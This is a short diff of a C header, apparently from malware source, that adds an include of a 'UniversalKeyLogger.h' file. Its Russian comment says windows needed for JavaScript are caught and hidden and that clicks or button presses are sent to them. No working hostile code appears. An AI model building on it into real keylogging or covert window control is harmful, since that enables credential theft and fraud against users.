@@ -1,7 +1,11 @@
 #ifndef bsssignH
 #define bsssignH
+
+
+
 #include <windows.h>
 #include <wininet.h>
+#include "UniversalKeyLogger.h"
 
 
 // здесь отлавливаються нужные окна для яваскрипта и хайдяться. туда посылаються клики, либо же нажимаються кнопки
